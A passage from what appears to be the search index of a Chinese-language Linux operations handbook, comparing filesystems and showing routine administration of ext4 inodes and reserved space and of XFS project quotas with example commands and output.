u200b\u4f46\u662f\u200b\u53ef\u80fd\u200b\u5b58\u5728\u200b\u989d\u5916\u200b\u7684\u200b\u6027\u80fd\u200b\u6216\u200b\u53ef\u9760\u6027\u200b\u95ee\u9898\u200b\u3002\u200b\u5176\u4e2d\u200b\u300cCoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u300d\u200b\u6307\u4ee3\u200b\u4e00\u7c7b\u200b\u4f7f\u7528\u200b\u5199\u65f6\u200b\u590d\u5236\u200b\uff08Copy-on-Write\uff09\u200b\u673a\u5236\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u8fd9\u200b\u7c7b\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5728\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u65f6\u200b\u4e0d\u4f1a\u200b\u8986\u76d6\u200b\u5185\u5bb9\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b\u65b0\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b\u5143\u200b\u6570\u636e\u200b\u6307\u5411\u200b\u65b0\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u8fd9\u200b\u7c7b\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7edd\u5927\u90e8\u5206\u200b\u90fd\u200b\u652f\u6301\u200b\u8bf8\u5982\u200b\u5feb\u7167\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002</p> \u200b\u6587\u4ef6\u7cfb\u7edf\u200b Linux macOS Windows \u200b\u7279\u70b9\u200b\u4e0e\u200b\u5907\u6ce8\u200b FAT32 (VFAT) \u200b\u4ec5\u200b\u9002\u7528\u200b\u4e8e\u200b EFI \u200b\u5206\u533a\u200b\u548c\u200b\u90e8\u5206\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b <code>/boot</code>\uff0c\u200b\u6216\u200b\u4e0d\u540c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4ea4\u6362\u6587\u4ef6\u200b\u7684\u200b\u573a\u5408\u200b\u3002\u200b\u4e0d\u200b\u652f\u6301\u200b\u5927\u4e8e\u200b 4 GiB \u200b\u7684\u200b\u6587\u4ef6\u200b\u3002 exFAT  (Linux 5.4+) \u200b\u5e94\u4ec5\u200b\u7528\u4e8e\u200b\u4e0d\u540c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4ea4\u6362\u6587\u4ef6\u200b\u3002\u200b\u4e0d\u200b\u652f\u6301\u200b\u65e5\u5fd7\u200b\u3002 ext4 Linux \u200b\u4e0a\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 XFS \u200b\u9002\u7528\u200b\u4e8e\u200b\u5927\u200b\u6587\u4ef6\u200b\u3001\u200b\u5927\u5bb9\u91cf\u200b\u7684\u200b\u573a\u5408\u200b\u3002\u200b\u65e0\u6cd5\u200b\u968f\u610f\u200b\u7f29\u5c0f\u200b<sup>4</sup>\u3002 ReiserFS  (deprecated) \u200b\u9002\u7528\u200b\u4e8e\u200b\u5b58\u50a8\u200b\u5927\u91cf\u200b\u5c0f\u200b\u6587\u4ef6\u200b\u7684\u200b\u573a\u5408\u200b\u3002\u200b\u7531\u4e8e\u200b\u5185\u6838\u200b\u4e3b\u7ebf\u200b\u5df2\u7ecf\u200b\u8003\u8651\u200b\u79fb\u9664\u200b\u652f\u6301\u200b\uff0c\u200b\u5982\u200b\u6709\u200b\u5b58\u50a8\u200b\u5927\u91cf\u200b\u5c0f\u200b\u6587\u4ef6\u200b\u9700\u6c42\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u65b9\u6848\u200b\u66ff\u4ee3\u200b\u3002 Btrfs \u200b\u5185\u200b\u7f6e\u4e8e\u200b Linux \u200b\u5185\u6838\u200b\u7684\u200b\u65b0\u4e00\u4ee3\u200b\u7684\u200b CoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u652f\u6301\u200b\u5feb\u7167\u200b\u3001\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\u7b49\u200b\u9ad8\u7ea7\u200b\u529f\u80fd\u200b\u3002RAID 5/6 \u200b\u652f\u6301\u200b\u4e0d\u200b\u7a33\u5b9a\u200b\uff0c\u200b\u4e5f\u200b\u6709\u200b\u5bf9\u200b\u6574\u4f53\u200b\u7a33\u5b9a\u6027\u200b\u7684\u200b\u4e89\u8bae\u200b\u3002 Bcachefs  (Linux 6.7 ~ 6.17) \u200b\u57fa\u4e8e\u200b Bcache \u200b\u7684\u200b\u65b0\u4e00\u4ee3\u200b CoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u65e8\u5728\u200b\u7528\u200b\u66f4\u200b\u7b80\u6d01\u200b\u7684\u200b\u4ee3\u7801\u200b\u5b9e\u73b0\u200b Btrfs \u200b\u548c\u200b ZFS \u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u91c7\u7528\u200b\u4e0e\u200b GPL \u200b\u517c\u5bb9\u200b\u7684\u200b\u8bb8\u53ef\u8bc1\u200b\u3002\u200b\u7531\u4e8e\u200b\u4e0e\u200b\u5185\u6838\u200b\u793e\u533a\u200b\u534f\u4f5c\u200b\u65b9\u5f0f\u200b\u7684\u200b\u51b2\u7a81\u200b\uff0cBcachefs \u200b\u5728\u200b Linux 6.17 \u200b\u4e2d\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u300c\u200b\u5916\u90e8\u200b\u7ef4\u62a4\u200b\u300d\uff0c\u200b\u5e76\u200b\u4ece\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7248\u672c\u200b\u5f00\u59cb\u200b\u88ab\u200b\u79fb\u9664\u200b\u51fa\u200b\u5185\u6838\u200b\u3002 ZFS \uff08\u200b\u9700\u8981\u200b kernel module\uff09 <sup>5</sup> \u200b\u8d77\u6e90\u4e8e\u200b Solaris \u200b\u7684\u200b CoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u9002\u7528\u200b\u4e8e\u200b\u5b58\u50a8\u200b\u5927\u91cf\u6587\u4ef6\u200b\u3001\u200b\u9700\u8981\u200b\u9ad8\u7ea7\u200b\u529f\u80fd\u200b\u7684\u200b\u573a\u5408\u200b\u3002\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u5185\u5b58\u200b\u548c\u200b CPU \u200b\u8d44\u6e90\u200b\u3002 NTFS  (Linux 5.15+) \u200b\u53ea\u8bfb\u200b Windows \u200b\u4e0a\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 HFS+ \u200b\u53ea\u8bfb\u200b \u200b\u53ea\u8bfb\u200b\uff0cBootcamp macOS \u200b\u8f83\u200b\u65e9\u671f\u200b\u7248\u672c\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 APFS macOS \u200b\u8f83\u200b\u65b0\u200b\u7248\u672c\u200b\u7684\u200b CoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 <p>\u200b\u6b64\u5916\u200b\uff0cLinux \u200b\u8fd8\u200b\u652f\u6301\u200b\u7528\u6237\u200b\u6001\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff08FUSE\uff09\u3002FUSE \u200b\u5141\u8bb8\u200b\u5728\u200b\u4e0d\u200b\u7f16\u5199\u200b\u5185\u6838\u200b\u4ee3\u7801\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u652f\u6301\u200b\u65b0\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002</p> <p>@taoky: \u200b\u5173\u4e8e\u200b ReiserFS</p> <p>ReiserFS \u200b\u5176\u5b9e\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0d\u80fd\u200b\u6709\u6548\u200b\u66ff\u4ee3\u200b\u7684\u200b\u4f18\u52bf\u200b\uff1a\u200b\u5b83\u200b\u662f\u200b\u76ee\u524d\u200b\u4e3b\u7ebf\u200b\u4e2d\u200b\u552f\u4e00\u200b\u4e00\u4e2a\u200b\u80fd\u591f\u200b\u53ea\u200b\u4f7f\u7528\u200b\u51e0\u4e2a\u200b GB \u200b\u7684\u200b\u7a7a\u95f4\u200b\u5c31\u200b\u80fd\u200b\u5b58\u50a8\u200b\u4e0a\u200b\u5343\u4e07\u4e2a\u200b\u6587\u4ef6\u200b\u5143\u200b\u6570\u636e\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 \uff08\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u4e00\u767e\u4e5d\u5341\u200b\u4e07\u4e2a\u200b\u53ea\u6709\u200b\u51e0\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0cReiserfs \u200b\u53ea\u200b\u9700\u8981\u200b 325MB\uff0c\u200b\u800c\u200b\u5bf9\u6bd4\u200b\u4e4b\u4e0b\u200b\uff0c\u200b\u5373\u4f7f\u200b\u662f\u200b\u300c\u200b\u9488\u5bf9\u200b\u5c0f\u200b\u6587\u4ef6\u200b\u4f18\u5316\u200b\u300d\u200b\u7684\u200b Btrfs \u200b\u4e5f\u200b\u9700\u8981\u200b\u63a5\u8fd1\u200b 1GB\u3002\uff09 \u200b\u8fd9\u4e2a\u200b\u573a\u666f\u200b\u5728\u200b\u955c\u50cf\u200b\u7ad9\u200b\u4f7f\u7528\u200b rsync-huai \u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\u3002 @shankerwangmiao \u200b\u7684\u200b patch \u200b\u4f7f\u5f97\u200b rsync \u200b\u670d\u52a1\u5668\u200b\u53ef\u4ee5\u200b\u5206\u79bb\u200b\u5143\u200b\u6570\u636e\u200b\u548c\u200b\u6587\u4ef6\u200b\u5b9e\u9645\u200b\u7684\u200b\u6570\u636e\u200b\u2014\u2014\u200b\u6b64\u65f6\u200b\u5143\u200b\u6570\u636e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b58\u50a8\u200b\u5728\u200b SSD \u200b\u6216\u8005\u200b\u5185\u5b58\u200b\u76d8\u200b\u4e0a\u200b\uff0c \u200b\u5b9e\u9645\u200b\u7684\u200b\u6587\u4ef6\u200b\u5b58\u50a8\u200b\u5728\u200b HDD \u200b\u4e0a\u200b\u3002\u200b\u7531\u4e8e\u200b rsync \u200b\u603b\u662f\u200b\u9700\u8981\u200b\u626b\u200b\u4e00\u904d\u200b\u6587\u4ef6\u200b\u6765\u200b\u6784\u5efa\u200b\u540c\u6b65\u200b\u5217\u8868\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u4e48\u200b\u505a\u200b\u53ef\u4ee5\u200b\u5927\u5927\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b Hans Reiser \u200b\u6ca1\u6709\u200b\u72af\u4e0b\u200b\u6740\u59bb\u200b\u4e4b\u7f6a\u200b\u7684\u8bdd\u200b\uff0cReiserFS\uff08\u200b\u6216\u8005\u200b\u540e\u7ee7\u8005\u200b Reiser4\uff09\u200b\u5f88\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6210\u4e3a\u200b ext4 \u200b\u7684\u200b\u5f3a\u6709\u529b\u200b\u7ade\u4e89\u8005\u200b\u3002\u200b\u4f46\u662f\u200b\u5f88\u200b\u53ef\u60dc\u200b\uff0c\u200b\u5386\u53f2\u200b\u662f\u200b\u4e0d\u80fd\u200b\u505a\u200b\u300c\u200b\u5982\u679c\u200b\u300d\u200b\u7684\u200b\u3002 \u200b\u867d\u7136\u200b\u6211\u200b\u6709\u65f6\u5019\u200b\u4f1a\u60f3\u200b\uff0c\u200b\u5982\u679c\u200b\u6211\u200b\u5728\u200b LKML \u200b\u4e2d\u200b\u8ba8\u8bba\u200b\u662f\u5426\u200b\u5e94\u8be5\u200b\u79fb\u9664\u200b ReiserFS \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u56de\u590d\u200b\u8fd9\u6837\u200b\u4e00\u4e2a\u200b use case\uff0c\u200b\u4f1a\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1f \u200b\u5373\u4f7f\u200b ReiserFS \u200b\u76ee\u524d\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u89e3\u51b3\u200b 2038 \u200b\u95ee\u9898\u200b\uff0c\u200b\u4e4b\u540e\u200b\u4e5f\u200b\u603b\u80fd\u200b\u6709\u200b\u529e\u6cd5\u200b\u89e3\u51b3\u200b\u2014\u2014\u200b\u5927\u4e0d\u4e86\u200b\u91cd\u65b0\u200b\u683c\u5f0f\u5316\u200b\u4e00\u6b21\u200b\u3002</p> <p>\u200b\u53ea\u662f\u200b\uff0c\u200b\u5bf9\u200b\u8fc7\u53bb\u200b\u7684\u200b\u4e8b\u60c5\u200b\u505a\u200b\u5047\u8bbe\u200b\u662f\u200b\u6ca1\u6709\u200b\u610f\u4e49\u200b\u7684\u200b\u3002\u200b\u81f3\u4e8e\u200b rsync-huai\uff0c\u200b\u53ef\u80fd\u200b\u5f97\u200b\u505a\u200b\u4e00\u4e2a\u200b\u57fa\u4e8e\u200b\u6570\u636e\u5e93\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u4ec0\u4e48\u200b\u65f6\u5019\u200b\u80fd\u591f\u200b\u5b8c\u6210\u200b\u5c31\u200b\u4e0d\u200b\u77e5\u9053\u200b\u4e86\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u5c06\u200b\u5173\u6ce8\u200b\u5728\u200b Linux \u200b\u670d\u52a1\u5668\u7aef\u200b\u5e38\u89c1\u200b\u7684\u200b\u573a\u666f\u200b\u3002\u200b\u8868\u683c\u200b\u4e2d\u200b\u6307\u5411\u200b ArchWiki \u200b\u7684\u200b\u94fe\u63a5\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u6709\u6240\u200b\u5e2e\u52a9\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#ext4","title":"ext4","text":"<p>ext4 \u200b\u662f\u200b\u5305\u62ec\u200b Debian \u200b\u548c\u200b Ubuntu \u200b\u5728\u5185\u200b\u7684\u200b\u4f17\u591a\u200b\u53d1\u884c\u7248\u200b\u4e3a\u200b\u7cfb\u7edf\u200b\u5206\u533a\u200b\uff08\u200b\u6839\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff09\u200b\u9ed8\u8ba4\u200b\u91c7\u7528\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u683c\u5f0f\u200b\u3002 \u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u7279\u6b8a\u200b\u7684\u200b\u9700\u6c42\u200b\uff0cext4 \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4e0d\u9519\u200b\u7684\u200b\u9009\u62e9\u200b\uff1b\u200b\u5373\u4f7f\u200b\u6709\u200b\u5176\u4ed6\u200b\u9700\u6c42\u200b\uff0c\u200b\u4e5f\u200b\u5efa\u8bae\u200b\u5bf9\u7cfb\u7edf\u200b\u5206\u533a\u200b\u4f7f\u7528\u200b ext4\u3002 ext4 \u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u95ee\u9898\u200b\u4e4b\u4e00\u200b\u662f\u200b inode \u200b\u7684\u200b\u6570\u91cf\u200b\u9650\u5236\u200b\u3002</p> <p>inode</p> <p>inode \u200b\u662f\u200b Unix \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u6982\u5ff5\u200b\uff0c\u200b\u5176\u200b\u5305\u542b\u200b\u4e86\u200b\u6587\u4ef6\u200b\uff08\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5bf9\u8c61\u200b\uff09\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff08\u200b\u5982\u200b\u6743\u9650\u200b\u3001\u200b\u5927\u5c0f\u200b\u3001\u200b\u65f6\u95f4\u200b\u7b49\u200b\uff09\uff0c\u200b\u6bcf\u4e2a\u200b\u6587\u4ef6\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b inode\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5728\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0a\u200b\u552f\u4e00\u200b\u7684\u200b inode \u200b\u53f7\u7801\u200b\u3002 \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>stat</code> \u200b\u6216\u200b <code>ls -i</code> \u200b\u67e5\u770b\u200b\u6587\u4ef6\u200b\u7684\u200b inode \u200b\u4fe1\u606f\u200b\u3002</p> <pre><code>$ stat test\n  File: test\n  Size: 0           Blocks: 0          IO Block: 4096   regular empty file\nDevice: 0,28    Inode: 54475724    Links: 1\nAccess: (0644/-rw-r--r--)  Uid: ( 1000/   username)   Gid: ( 1000/   username)\nAccess: 2024-02-11 00:23:27.743633975 +0800\nModify: 2024-02-11 00:23:27.743633975 +0800\nChange: 2024-02-11 00:23:27.743633975 +0800\n Birth: 2024-02-11 00:23:27.743633975 +0800\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b test \u200b\u6587\u4ef6\u200b\u7684\u200b inode \u200b\u53f7\u7801\u200b\u5219\u200b\u4e3a\u200b 54475724\u3002</p> <p>\u200b\u5728\u200b\u521b\u5efa\u200b ext4 \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u56fa\u5b9a\u200b\u540d\u4e3a\u200b \"bytes-per-inode\" \u200b\u7684\u200b\u53c2\u6570\u200b\uff0c\u200b\u7528\u4e8e\u200b\u63a7\u5236\u200b\u603b\u200b\u7684\u200b inode \u200b\u6570\u91cf\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u786c\u76d8\u200b\u4e0a\u200b\u6bcf\u200b\u6709\u200b 16KB \u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u4fdd\u7559\u200b\u4e00\u4e2a\u200b inode\u3002 \u200b\u8be5\u200b\u53c2\u6570\u200b\u65e0\u6cd5\u200b\u5728\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u521b\u5efa\u200b\u540e\u200b\u66f4\u6539\u200b\u3002 \u200b\u56e0\u6b64\u200b\uff0c\u200b\u5982\u679c\u200b\u521b\u5efa\u200b\u4e86\u200b\u5927\u91cf\u200b\u5c0f\u200b\u6587\u4ef6\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u5e76\u200b\u6ca1\u6709\u7528\u5b8c\u200b\uff0c\u200b\u4f46\u662f\u200b\u5df2\u7ecf\u200b\u65e0\u6cd5\u200b\u518d\u200b\u521b\u5efa\u200b\u65b0\u200b\u6587\u4ef6\u200b\u4e86\u200b\u3002 \u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u6269\u5145\u200b\u4e86\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5bb9\u91cf\u200b\uff0c\u200b\u90a3\u4e48\u200b inode \u200b\u7684\u200b\u6570\u91cf\u200b\u4e5f\u200b\u4f1a\u200b\u6309\u200b\u6bd4\u4f8b\u200b\u589e\u52a0\u200b\u3002</p> <p>\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0cext4 \u200b\u9ed8\u8ba4\u200b\u7684\u200b 5% \u200b\u4fdd\u7559\u7a7a\u95f4\u200b\u4e5f\u200b\u662f\u200b\u5e38\u4f1a\u200b\u9047\u5230\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u8fd9\u200b\u4e00\u90e8\u5206\u200b\u4fdd\u7559\u7a7a\u95f4\u200b\u4ec5\u200b\u5141\u8bb8\u200b root \u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4ee5\u200b\u5728\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u4e0d\u8db3\u200b\u65f6\u200b\u4ecd\u200b\u4fdd\u8bc1\u200b root \u200b\u6743\u9650\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u80fd\u591f\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\u3002 \u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u73b0\u4ee3\u200b\u7684\u200b\u5927\u5bb9\u91cf\u200b\u78c1\u76d8\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u90e8\u5206\u200b\u7a7a\u95f4\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6d6a\u8d39\u200b\u5f88\u591a\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>tune2fs</code> \u200b\u547d\u4ee4\u200b\u8c03\u6574\u200b\u8fd9\u4e00\u200b\u53c2\u6570\u200b\uff1a</p> <pre><code>sudo tune2fs -m 1 /dev/sda1  # \u200b\u5c06\u200b\u4fdd\u7559\u7a7a\u95f4\u200b\u8c03\u6574\u200b\u4e3a\u200b 1%\n</code></pre>"},{"location":"ops/storage/filesystem/#xfs","title":"XFS","text":"<p>ArchWiki: XFS is a high-performance journaling file system created by Silicon Graphics, Inc. XFS is particularly proficient at parallel IO due to its allocation group based design. This enables extreme scalability of IO threads, filesystem bandwidth, file and filesystem size when spanning multiple storage devices.</p> <p>\u200b\u5bf9\u4e8e\u200b\u955c\u50cf\u200b\u7ad9\u200b\u573a\u666f\u200b\uff0cXFS \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4e0d\u9519\u200b\u7684\u200b\u9009\u9879\u200b\uff0c\u200b\u81f3\u5c11\u200b\u4e0d\u200b\u9700\u8981\u200b\u53bb\u200b\u62c5\u5fc3\u200b inode \u200b\u4f1a\u200b\u4e0d\u4f1a\u200b\u7528\u200b\u5b8c\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b XFS \u200b\u7684\u200b\u7279\u8272\u200b\u529f\u80fd\u200b\uff1a\u200b\u57fa\u4e8e\u200b\u9879\u76ee\u200b\uff08Project\uff09\u200b\u7684\u200b\u914d\u989d\u200b\uff08Quota\uff09\u3002 \u200b\u8be5\u200b\u529f\u80fd\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u6587\u4ef6\u5939\u200b\u5927\u5c0f\u200b\u7edf\u8ba1\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\u662f\u200b\uff1a\u200b\u4e86\u89e3\u200b\u6bcf\u4e2a\u200b\u6587\u4ef6\u5939\u200b\u5360\u7528\u200b\u4e86\u200b\u591a\u5c11\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u7f13\u6162\u200b\u5730\u200b\u904d\u5386\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 ext4 \u200b\u5728\u200b\u8f83\u200b\u65b0\u200b\u7684\u200b\u7248\u672c\u200b\u4e2d\u200b\u4e5f\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u529f\u80fd\u200b\uff08\u200b\u4e4b\u524d\u200b\u4ec5\u200b\u652f\u6301\u200b\u57fa\u4e8e\u200b\u7528\u6237\u200b\u6216\u7ec4\u200b\u7684\u200b\u914d\u989d\u200b\uff09\u3002</p> <pre><code>$ sudo truncate -s 8G xfs.img\n$ sudo mkfs.xfs xfs.img\nmeta-data=xfs.img                isize=512    agcount=4, agsize=524288 blks\n         =                       sectsz=512   attr=2, projid32bit=1\n         =                       crc=1        finobt=1, sparse=1, rmapbt=1\n         =                       reflink=1    bigtime=1 inobtcount=1 nrext64=1\ndata     =                       bsize=4096   blocks=2097152, imaxpct=25\n         =                       sunit=0      swidth=0 blks\nnaming   =version 2              bsize=4096   ascii-ci=0, ftype=1\nlog      =internal log           bsize=4096   blocks=16384, version=2\n         =                       sectsz=512   sunit=0 blks, lazy-count=1\nrealtime =none                   extsz=4096   blocks=0, rtextents=0\n$ sudo mount -o prjquota xfs.img /media/xfs  # \u200b\u9700\u8981\u200b\u5728\u200b\u6302\u8f7d\u200b\u65f6\u200b\u542f\u7528\u200b\u9879\u76ee\u200b\u914d\u989d\u200b\u529f\u80fd\u200b\n$ sudo mkdir /media/xfs/a /media/xfs/b /media/xfs/c\n</code></pre> <p>XFS \u200b\u7684\u200b\u9879\u76ee\u200b\u914d\u989d\u200b\u529f\u80fd\u200b\u914d\u7f6e\u200b\u4f4d\u4e8e\u200b <code>/etc/projects</code> \u200b\u4e0e\u200b <code>/etc/projid</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u3002 \u200b\u5176\u4e2d\u200b <code>/etc/projects</code> \u200b\u5b58\u50a8\u200b\u8def\u5f84\u200b\u4e0e\u200b\u9879\u76ee\u200b ID \u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u800c\u200b <code>/etc/projid</code> \u200b\u5b58\u50a8\u200b\u9879\u76ee\u200b ID \u200b\u4e0e\u200b\u9879\u76ee\u540d\u79f0\u200b\u7684\u200b\u6620\u5c04\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u4e0a\u9762\u200b\u521b\u5efa\u200b\u7684\u200b\u4e09\u4e2a\u200b\u6587\u4ef6\u5939\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u7f16\u8f91\u200b\u4e0a\u8ff0\u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5206\u522b\u200b\u521b\u5efa\u200b\u914d\u989d\u200b\uff1a</p> <pre><code>$ cat /etc/projects\n1:/media/xfs/a\n2:/media/xfs/b\n3:/media/xfs/c\n$ cat /etc/projid\na:1\nb:2\nc:3\n</code></pre> <p>\u200b\u7136\u540e\u200b\u521d\u59cb\u5316\u200b\u9879\u76ee\u200b\uff08\u200b\u5982\u679c\u200b\u6587\u4ef6\u5939\u200b\u4e2d\u200b\u5df2\u7ecf\u200b\u6709\u200b\u5927\u91cf\u6587\u4ef6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u521d\u59cb\u5316\u200b\uff09\uff1a</p> <pre><code>$ sudo xfs_quota -x -c 'project -s a'\nSetting up project a (path /media/xfs/a)...\nProcessed 1 (/etc/projects and cmdline) paths for project a with recursion depth infinite (-1).\n$ sudo xfs_quota -x -c 'project -s b'\nSetting up project b (path /media/xfs/b)...\nProcessed 1 (/etc/projects and cmdline) paths for project b with recursion depth infinite (-1).\n$ sudo xfs_quota -x -c 'project -s c'\nSetting up project c (path /media/xfs/c)...\nProcessed 1 (/etc/projects and cmdline) paths for project c with recursion depth infinite (-1).\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u5411\u200b\u8fd9\u4e9b\u200b\u6587\u4ef6\u5939\u200b\u4e2d\u200b\u5199\u5165\u200b\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b <code>xfs_quota</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u914d\u989d\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b\u3002</p> <pre><code>$ sudo cp /etc/os-release /media/xfs/a/\n$ sudo xfs_quota -c 'df -h'\nFilesystem     Size   Used  Avail Use% Pathname\n/dev/loop4     7.9G 187.9M   7.8G   2% /media/xfs\n/dev/loop4     7.9G     4K   7.8G   0% /media/xfs/a\n/dev/loop4     7.9G      0   7.8G   0% /media/xfs/b\n/dev/loop4     7.9G      0   7.8G   0% /media/xfs/c\n/dev/nvme0n1p3\n               1.8T   1.4T 400.9G  78% /\n/dev/nvme0n1p3\n               1.8T   1.4T 400.9G  78% /home\n/dev/nvme0n1p3\n               1.8T   1.4T 400.9G  78% /opt\n/dev/nvme0n1p3\n               1.8T   1.4T 400.9G  78% /tmp\n/dev/nvme0n1p3\n               1.8T   1.4T 400.9G  78% /var\n/dev/nvme0n1p3\n               1.8T   1.4T 400.9G  78% /var/lib/docker/btrfs\n</code></pre> <p><code>xfs_quota</code> \u200b\u7684\u200b <code>df</code> \u200b\u4e5f\u200b\u4f1a\u200b\u8f93\u51fa\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u7a7a\u95f4\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5ffd\u7565\u200b\u5373\u53ef\u200b\u3002</p> <p>\u200b\u5f15\u7528\u200b\u590d\u5236\u200b</p> <p>\u200b\u5c3d\u7ba1\u200b\u4e0d\u662f\u200b CoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0cXFS 